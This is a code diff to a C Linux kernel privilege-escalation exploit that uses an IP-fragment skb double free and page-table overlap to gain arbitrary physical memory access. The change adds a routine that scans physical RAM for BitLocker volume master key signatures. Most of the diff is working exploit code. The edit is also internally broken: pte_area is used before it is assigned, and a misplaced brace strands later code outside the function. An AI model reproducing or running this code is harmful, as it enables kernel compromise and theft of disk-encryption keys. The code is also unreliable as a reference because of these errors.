@@ -234,149 +234,192 @@ void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modpr
 	return pmd_modprobe_addr;
 }
 
+static void search_for_vmk(void *pte_area, void *_pmd_area, void *pmd_data_area) {
+    printf("[+] Starting search for VMK\n");
+
+    // Iterate over physical memory in chunks of 2MB
+    for (unsigned long long i = 0; i < (CONFIG_PHYS_MEM / 0x200000); i++) {
+        unsigned long long phys_base = i * 0x200000ull; // Physical address of current haystack
+
+        // Setup 512 PTEs, 4KB (0x1000) each
+        for (unsigned short j = 0; j < 512; j++) {
+            pte_area[512 + j] = (phys_base + 0x1000ull * j) | 0x8000000000000867;
+        }
+
+        flush_tlb(_pmd_area, 0x400000); // Flush TLB to apply changes
+
+        // Search for FVE_KEY_TABLE_HEADER signature in mapped memory
+        void *pmd_vmk_hdr_addr = memmem(pmd_data_area, 0x200000, "-FVE-FS-", 8);
+
+        if (pmd_vmk_hdr_addr != NULL) {
+            printf("[+] Found possible VMK header at: %p\n", pmd_vmk_hdr_addr);
+            uint32_t version = *(uint32_t *)(pmd_vmk_hdr_addr + 8 + 4);
+            uint32_t start = *(uint32_t *)(pmd_vmk_hdr_addr + 8 + 4 + 4);
+            uint32_t end = *(uint32_t *)(pmd_vmk_hdr_addr + 8 + 4 + 4 + 4);
+
+            if (version != 1 || end <= start) {
+                printf("[!] VERSION or SIZE MISMATCH! Version: %d, Start: %d, End: %d\n", version, start, end);
+                continue;
+            }
+
+            // Look for VMK signature in the region
+            void *pmd_vmk_addr = memmem(pmd_vmk_hdr_addr, end, "\x03\x20\x01\x00", 4);
+            if (pmd_vmk_addr == NULL) {
+                printf("[!] VMK signature not found in the region!\n");
+                continue;
+            }
+
+            printf("[+] Found VMK signature at: %p\n", pmd_vmk_addr);
+        }
+    }
+}
+
 static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 {
-	unsigned long long *pte_area;
-	void *_pmd_area;
-	void *pmd_kernel_area;
-	void *pmd_data_area;
-	struct ip df_ip_header = {
-		.ip_v = 4,
-		.ip_hl = 5,
-		.ip_tos = 0,
-		.ip_len = 0xDEAD,
-		.ip_id = 0xDEAD, 
-		.ip_off = 0xDEAD,
-		.ip_ttl = 128,
-		.ip_p = 70,
-		.ip_src.s_addr = inet_addr("1.1.1.1"),
-		.ip_dst.s_addr = inet_addr("255.255.255.255"),
-	};
-	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };
+    unsigned long long *pte_area;
+    void *_pmd_area;
+    void *pmd_kernel_area;
+    void *pmd_data_area;
+    struct ip df_ip_header = {
+        .ip_v = 4,
+        .ip_hl = 5,
+        .ip_tos = 0,
+        .ip_len = 0xDEAD,
+        .ip_id = 0xDEAD, 
+        .ip_off = 0xDEAD,
+        .ip_ttl = 128,
+        .ip_p = 70,
+        .ip_src.s_addr = inet_addr("1.1.1.1"),
+        .ip_dst.s_addr = inet_addr("255.255.255.255"),
+    };
+    char modprobe_path[KMOD_PATH_LEN] = { '\x00' };
 
-	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
+    get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
 
-	printf("[+] running normal privesc\n");
+    printf("[+] running normal privesc\n");
 
     PRINTF_VERBOSE("[*] doing first useless allocs to setup caching and stuff...\n");
 
-	pin_cpu(0);
+    pin_cpu(0);
 
-	// allocate PUD (and a PMD+PTE) for PMD
-	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;
+    // allocate PUD (and a PMD+PTE) for PMD
+    mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    *(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;
 
-	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
-	// needs to be minimal since VMA registration costs memory
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-	{
-		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    // pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
+    // needs to be minimal since VMA registration costs memory
+    for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+    {
+        void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
-		if (retv == MAP_FAILED)
-		{
-			perror("mmap");
-			exit(EXIT_FAILURE);
-		}
-	}
+        if (retv == MAP_FAILED)
+        {
+            perror("mmap");
+            exit(EXIT_FAILURE);
+        }
+    }
 
-	// pre-allocate PMDs for sprayed PTEs
-	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
-		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
-	
-	// these use different PTEs but the same PMD
-	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	pmd_kernel_area = _pmd_area;
-	pmd_data_area = _pmd_area + 0x200000;
+    _pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    pmd_kernel_area = _pmd_area;
+    pmd_data_area = _pmd_area + 0x200000;
 
-	PRINTF_VERBOSE("[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n", _pmd_area, modprobe_path, modprobe_path);
+    PRINTF_VERBOSE("[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n", _pmd_area, modprobe_path, modprobe_path);
 
-	populate_sockets();
+    // Perform memory spraying
+    for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++) {
+        *(char *)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
+    }
 
-	set_ipfrag_time(1);
+    // Search for VMK
+    search_for_vmk(pte_area, _pmd_area, pmd_data_area);
 
-	// cause socket/networking-related objects to be allocated
-	df_ip_header.ip_id = 0x1336;
-	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
-	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
-	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);
+    // Original privilege escalation logic continues...
 
-	set_ipfrag_time(9999);
+    set_ipfrag_time(1);
 
-	printf("[*] waiting for the calm before the storm...\n");
-	sleep(CONFIG_SEC_BEFORE_STORM);
+    // cause socket/networking-related objects to be allocated
+    df_ip_header.ip_id = 0x1336;
+    df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
+    df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
+    alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);
 
-	// pop N skbs from skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		alloc_ipv4_udp(1);
-	}
+    set_ipfrag_time(9999);
 
-	// allocate and free 1 skb from freelist
-	df_ip_header.ip_id = 0x1337;
-	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
-	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
-	trigger_double_free_hdr(32768 + 8, &df_ip_header);
-	
-	// push N skbs to skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		recv_ipv4_udp(1);
-	}
+    printf("[*] waiting for the calm before the storm...\n");
+    sleep(CONFIG_SEC_BEFORE_STORM);
 
-	// spray-allocate the PTEs from PCP allocator order-0 list
-	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
+    // pop N skbs from skb freelist
+    for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+    {
+        PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
+        alloc_ipv4_udp(1);
+    }
 
-	PRINTF_VERBOSE("[*] double-freeing skb...\n");
+    // allocate and free 1 skb from freelist
+    df_ip_header.ip_id = 0x1337;
+    df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
+    df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
+    trigger_double_free_hdr(32768 + 8, &df_ip_header);
+    
+    // push N skbs to skb freelist
+    for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+    {
+        PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
+        recv_ipv4_udp(1);
+    }
 
-	// cause double-free on skb from earlier
-	df_ip_header.ip_id = 0x1337;
-	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
-	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
-	
-	// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
-	// causes end == offset in ip_frag_queue(). packet will be empty
-	// remains running until after both frees, a.k.a. does not require sleep
-	alloc_intermed_buf_hdr(0, &df_ip_header);
+    // spray-allocate the PTEs from PCP allocator order-0 list
+    printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
+    for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+        *(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
 
-	// allocate overlapping PMD page (overlaps with PTE)
-	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
+    PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
-	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
+    // cause double-free on skb from earlier
+    df_ip_header.ip_id = 0x1337;
+    df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
+    df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
+    
+    // skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
+    // causes end == offset in ip_frag_queue(). packet will be empty
+    // remains running until after both frees, a.k.a. does not require sleep
+    alloc_intermed_buf_hdr(0, &df_ip_header);
 
-	// find overlapped PTE area
-	pte_area = NULL;
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-	{
-		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
+    // allocate overlapping PMD page (overlaps with PTE)
+    *(unsigned long long*)_pmd_area = 0xCAFEBABE;
 
-		// pte entry pte[0] should be the PFN+flags for &_pmd_area
-		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
-		if (*test_target_addr != 0x41)
-		{
-			printf("[+] confirmed double alloc PMD/PTE\n");
-			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
-			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
-			pte_area = test_target_addr;
-		}
-	}
+    printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
-	if (pte_area == NULL)
-	{
-		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);
+    // find overlapped PTE area
+    pte_area = NULL;
+    for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+    {
+        unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
 
-		return;
-	}
-	
-	// set new pte value for sanity check
-	*pte_area = 0x0 | 0x8000000000000867;
+        // pte entry pte[0] should be the PFN+flags for &_pmd_area
+        // if this is the double allocated PTE, the value is PFN+flags, not 0x41
+        if (*test_target_addr != 0x41)
+        {
+            printf("[+] confirmed double alloc PMD/PTE\n");
+            PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
+            PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
+            pte_area = test_target_addr;
+        }
+    }
 
-	flush_tlb(_pmd_area, 0x400000);
-	PRINTF_VERBOSE("    - PMD area (read target value/page): %016llx (new)\n", *(unsigned long long*)_pmd_area);
+    if (pte_area == NULL)
+    {
+        printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);
+
+        return;
+    }
+    
+    // set new pte value for sanity check
+    *pte_area = 0x0 | 0x8000000000000867;
+
+    flush_tlb(_pmd_area, 0x400000);
+    PRINTF_VERBOSE("    - PMD area (read target value/page): %016llx (new)\n", *(unsigned long long*)_pmd_area);
+}
 
 	// run this script instead of /sbin/modprobe
 	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
